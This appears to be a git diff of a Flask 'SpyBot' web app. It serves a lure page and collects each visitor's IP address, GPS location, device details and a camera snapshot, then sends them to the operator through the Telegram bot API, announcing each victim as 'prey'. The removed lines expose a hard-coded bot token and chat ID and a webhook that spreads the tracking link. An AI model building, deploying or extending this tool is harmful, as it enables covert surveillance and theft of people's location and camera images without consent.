@@ -1,55 +1,53 @@
 from flask import Flask, request, render_template
-import requests, os
+import requests, base64, os
 
-app = Flask(__name__, template_folder="templates", static_folder="static")
+app = Flask(__name__, template_folder='templates', static_folder='static')
 
-BOT_TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
-CHAT_ID = "6908281054"
+BOT_TOKEN = "آپ_کا_ٹیلگرام_بوٹ_ٹوکن"
+CHAT_ID = "آپ_کا_چیٹ_ID"
 
-@app.route("/")
-def home():
+@app.route('/')
+def index():
     return render_template("spy.html")
 
-@app.route("/collect", methods=["POST"])
+@app.route('/collect', methods=['POST'])
 def collect():
     data = request.json
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    location = f"https://maps.google.com/?q={data.get('latitude')},{data.get('longitude')}" if data.get('latitude') else "❌ Location Not Available"
+    ua = data.get('userAgent', 'Unknown')
+    lat = data.get('latitude')
+    lon = data.get('longitude')
+    camera = data.get('camera', 'Unknown')
+    device = data.get('deviceInfo', 'Unknown')
+    location = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else "❌ Location Not Available"
 
     message = f"""
 👁️ شکار آیا!
 🌐 IP Address: {ip}
-📱 Device: {data.get('userAgent')}
+📱 Device: {ua}
 📍 Location: {location}
-📷 Camera: {data.get('camera')}
-🧠 Device Info: {data.get('deviceInfo')}
-"""
+📷 Camera: {camera}
+🧠 Device Info: {device}
+    """
 
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
-        "chat_id": CHAT_ID,
-        "text": message
-    })
+    # Send text
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    requests.post(url, data={'chat_id': CHAT_ID, 'text': message})
+
+    # Send image if available
+    snapshot = data.get("snapshot")
+    if snapshot:
+        image_data = snapshot.split(",")[1]
+        file_path = "static/snap.png"
+        with open(file_path, "wb") as f:
+            f.write(base64.b64decode(image_data))
+
+        photo_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+        with open(file_path, "rb") as photo:
+            requests.post(photo_url, data={"chat_id": CHAT_ID}, files={"photo": photo})
 
     return "OK", 200
 
-@app.route(f"/{BOT_TOKEN}", methods=["POST"])
-def webhook():
-    update = request.get_json()
-    if "message" in update and "text" in update["message"]:
-        chat_id = update["message"]["chat"]["id"]
-        text = update["message"]["text"]
-        if text == "/start":
-            msg = (
-                "👋 خوش آمدید Faizan™ SpyBot میں!\n"
-                "🔍 اپنا پروفائل چیک کریں 👇\n"
-                "🌐 https://faizan-spybot.onrender.com"
-            )
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
-                "chat_id": chat_id,
-                "text": msg
-            })
-    return "ok", 200
-
-if __name__ == "__main__":
+if __name__ == '__main__':
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
